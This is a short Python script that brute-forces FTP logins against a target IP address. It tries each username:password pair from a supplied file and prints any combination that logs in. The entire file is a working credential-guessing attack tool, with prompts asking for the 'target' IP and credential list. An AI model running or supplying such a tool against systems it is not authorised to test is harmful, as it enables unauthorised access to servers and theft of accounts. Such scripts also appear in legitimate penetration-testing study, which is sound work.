#!/usr/bin/python

##
# Usage: 192.168.1.0 + File passwords.txt 
##
##
##
import ftplib;

def bruteLogin(hostname,passwordFile):
    try:
        pF = open(passwordFile, "r");
    except:
        print("[!!] There is no file!");
    for line in pF.readlines():
        userName = line.split(':')[0];
        passWord = line.split(':')[1].strip('\n');
        print('[*] Trying:', userName ,"/", passWord);
        try:
            ftp = ftplib.FTP(hostname);
            login = ftp.login(userName, passWord);
            print("[*] Login sucessfully with:", userName ,"/", passWord);
            ftp.quit();
        except:
            print("[-] Password is not on the list!");
            
host = input('[*]Enter the IP address of the target:');
passwordFile = input("[*] Enter the target's users/passwords path file:");
bruteLogin(host,passwordFile);
